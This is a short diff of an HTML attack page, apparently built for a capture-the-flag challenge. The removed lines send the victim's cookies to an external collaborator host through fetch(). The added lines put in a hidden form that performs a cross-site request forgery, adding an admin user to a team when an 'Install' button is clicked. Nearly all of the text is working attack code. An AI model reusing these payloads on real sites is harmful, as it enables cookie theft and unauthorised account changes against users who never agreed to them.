@@ -6,11 +6,12 @@
 <body>
     <h1>Malicious Page</h1>
     <button id="installbutton">Install</button>
+    <form id="csrfForm" method="POST" action="https://internaltool.ctf.yogosha.com/api/teams/1/addUser/admin" style="display: none;">
+        <input type="hidden" name="csrfToken" value="your_csrf_token">
+    </form>
     <script>
-        fetch('http://mf51f6p01jp4dfise46fdx2vwm2dq9ey.oastify.com', {
-            method: 'POST',
-            body: JSON.stringify({ cookies: document.cookie }),
-            headers: { 'Content-Type': 'application/json' }
+        document.getElementById('installbutton').addEventListener('click', function() {
+            document.getElementById('csrfForm').submit();
         });
     </script>
 </body>
